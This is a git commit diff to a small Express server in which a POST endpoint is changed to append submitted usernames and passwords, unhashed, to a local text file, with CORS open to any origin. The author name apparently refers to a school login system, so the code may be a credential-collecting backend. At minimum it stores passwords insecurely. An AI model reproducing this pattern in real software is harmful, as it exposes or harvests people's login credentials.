40efe6ddc39e614a1b37d3c052ae9322499b5b23
jwxt.gsupl <3494545753@qq.com>
2025-12-06 23:13:34 +0800

    Update server.js

--- server.js
+++ server.js
@@ -2,24 +2,24 @@ const express = require('express');
 const cors = require('cors');
 const fs = require('fs');
 const app = express();
-
 app.use(cors());
-app.use(express.json());
+app.use(express.json()); 
 
 app.post('/save', (req, res) => {
-    const { text1, text2 } = req.body;
-    const saveContent = `[${new Date().toLocaleString()}] 文字1:${text1},.文字2:${text2}\n`;
-
-    fs.appendFile('data.txt', saveContent, (err) => {
-        if (err) {
-            console.error('保存失败：', err);
-            res.send('保存失败');
-            return;
-        }
-        res.send('保存成功');
-    });
+  const { username, password } = req.body;
+  const now = new Date().toLocaleString();
+  const content = `用户名：${username}，密码：${password}  ${now}\n`;
+  fs.appendFile('C:\\web-project\\data.txt', content, (err) => {
+    if (err) {
+      console.log('写入文件失败：', err);
+      res.status(500).send('保存失败！');
+      return;
+    }
+    console.log('数据已写入data.txt');
+    res.send('保存成功！'); 
+  });
 });
 
 app.listen(3000, () => {
-    console.log('后端服务已启动,访问地址:http://localhost:3000');
+  console.log('后端服务已启动，访问地址:http://localhost:3000');
 });
